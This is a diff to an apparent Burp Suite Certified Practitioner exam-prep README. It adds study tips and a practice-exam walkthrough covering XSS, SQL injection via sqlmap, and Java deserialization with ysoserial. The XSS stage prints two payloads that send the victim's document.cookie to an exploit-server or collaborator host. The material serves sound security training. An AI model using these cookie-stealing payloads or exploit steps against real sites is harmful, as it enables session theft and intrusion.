@@ -70,9 +70,13 @@ Kudos to https://github.com/botesjuan/ for this awesome image, that defines poss
 
 
 ## Tips
-I've got only one tip, you MUST use on exam:  
-**Use targeted scan.** It is not secret, that almost all types of vulnerabilities can be detected with targeted scan. XSS, Directory traversal, Host Headers, XXE, OS Command Injection, SSTI, SQL. All these vulnerabilities WILL be detected by your scanner.  
+I've got only two important tips to prepare you for exam:  
+**1. Use targeted scan.**  
+It is not secret, that almost all types of vulnerabilities can be detected with targeted scan. XSS, Directory traversal, Host Headers, XXE, OS Command Injection, SSTI, SQL. All these vulnerabilities WILL be detected by your scanner.  
 ![image](https://user-images.githubusercontent.com/58632878/224570578-5556461e-8bd1-467d-a51d-4ebef4e66bba.png)  
+  
+**2. Try to pass 10 mystery labs WITHOUT revealing the object or other hints.**  
+Set the level to Practicioner and category to Any. Yes, this WILL be hard, but if you really can pass 10 different mystery labs in a row, you ARE prepared for exam.  
   
 **ATTENTION:** If you want some others tips for the exam, I recommend you to read this article:
 >https://micahvandeusen.com/burp-suite-certified-practitioner-exam-review/
@@ -1347,6 +1351,28 @@ Billing and Delivery Address:
 ]}
 ```
 
+
+# Practice exam
+## Approach
+Real exam is in **exactly** the same form as the practice one, so don't worry about this. I recommend you to use this walkthrough, in case you countered some issues:
+>https://www.r00tpgp.com/2021/08/burp-suite-certified-practitioner-exam.html  
+
+**Stage 1**  XSS  
+```
+"-(window["document"]["location"]="https://exploit%2D0ac7002303d74533c0b472c9016a00f3%2Eexploit%2Dserver%2Enet/?c="+window["document"]["cookie"])-"  
+OR my variant:  
+"-(window["location"]="http://umk7m0a67ilv35u5uonbj2i08rei29qy%2eoastify%2ecom/?c="+window["document"]["cookie"])}//
+```
   
+**Stage 2**  SQL Injection  
+Just pass it through sqlmap.
+  
+**Stage 3**  Insecure Deserialization  
+The same as labs with Java Deserialization. Payload is base64 + gzip, the only thing you need to brute is CommonsCollections version, just generate a couple payloads with ysoserial with different CommonsCollections version  
+[Insecure deserialization](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#insecure-deserialization)  
+  
+
 # Footnote
-> A really big thanks for my subscribers on [Arm1tage](https://t.me/arm1tage), I really do appreciate all your support... and... all the 💩 and 🤡 emotions under the posts XD (those who know, know). Buy me a... oh... wait... I don't give a fuck about money, all this is for free.
+> In general: Quite hard, passed it on the second try. I recieved the certificate 7 days after passing the exam, so keep calm about this.  
+> A really big thanks for my subscribers on [Arm1tage](https://t.me/arm1tage), I really do appreciate all your support... and... all the 💩 and 🤡 emotions under the posts XD (those who know, know).  
+> Buy me a... oh... wait... I don't give a fuck about money, all this is for free.
